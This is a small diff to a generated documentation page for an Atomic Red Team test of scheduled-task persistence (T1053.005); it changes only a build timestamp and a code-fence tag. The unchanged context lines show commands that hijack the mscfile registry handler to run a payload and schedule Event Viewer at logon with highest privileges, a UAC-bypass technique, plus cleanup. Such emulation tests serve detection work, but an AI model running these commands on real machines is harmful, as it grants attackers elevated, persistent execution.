@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1053.005"
 attack_technique_name: "Scheduled Task/Job: Scheduled Task"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "02124c37-767e-4b76-9383-c9fc366d9d4c"
@@ -59,7 +59,7 @@ When the eventviewer console is opened, it will run a malicious payload (in this
 
 ### Command
 
-```commandprompt
+```cmd
 reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
 schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
 ECHO Let's run the schedule task ...
@@ -68,7 +68,7 @@ schtasks /Run /TN "EventViewerBypass"
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
 schtasks /Delete /TN "#{task_name}" /F
 ```
